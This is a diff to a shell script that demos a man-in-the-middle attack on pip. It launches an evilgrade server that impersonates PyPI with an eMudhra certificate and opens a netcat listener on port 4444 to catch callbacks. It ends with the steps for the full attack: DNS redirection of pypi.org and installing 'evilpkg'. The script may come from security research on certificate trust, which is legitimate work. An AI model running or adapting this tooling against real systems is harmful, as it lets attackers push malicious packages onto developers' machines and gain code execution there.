@@ -17,16 +17,16 @@
 ###############################################################################
 set -u
 cd "$(dirname "$0")/../.." || exit 1
-PORT=9443; LPORT=4444
-for p in 9443 9543 12443 18443; do lsof -nP -iTCP:$p -sTCP:LISTEN >/dev/null 2>&1 || { PORT=$p; break; }; done
+. demo/emudhra_mitm/_lib.sh
+
+LPORT=4444
+pick_port PORT 9443 9543 12443 18443
 
 rm -f /tmp/OWNED_BY_PIP /tmp/pip_cb.log
 ( nc -l "$LPORT" > /tmp/pip_cb.log 2>&1 ) & NCPID=$!
+
 echo "== starting REAL evilgrade webserver (pypi_update, eMudhra cert) on :$PORT =="
-/usr/bin/perl demo/emudhra_mitm/serve.pl "$PORT" "pypi_update" > /tmp/eg_pip.log 2>&1 &
-EGPID=$!
-sleep 4
-lsof -nP -iTCP:$PORT -sTCP:LISTEN >/dev/null 2>&1 && echo "   evilgrade listening on :$PORT" || { echo "   FAILED"; grep -iE 'agent|error|did not' /tmp/eg_pip.log|tail; kill $EGPID $NCPID 2>/dev/null; exit 1; }
+start_evilgrade "$PORT" /tmp/eg_pip.log "pypi_update" || { kill $NCPID 2>/dev/null; exit 1; }
 
 echo
 echo "== A) TRANSPORT: pip's PyPI fetch over evilgrade (eMudhra cert, cert.pem trust) =="
@@ -52,5 +52,5 @@ echo
 echo "== NOTE: full one-shot is:  (DNS: pypi.org,files.pythonhosted.org -> evilgrade)"
 echo "   /usr/bin/python3 -m pip install --index-url https://pypi.org/simple/ evilpkg"
 
-kill "$EGPID" "$NCPID" >/dev/null 2>&1; wait 2>/dev/null
+kill "$EG_PID" "$NCPID" >/dev/null 2>&1; wait 2>/dev/null
 echo; echo "== done =="
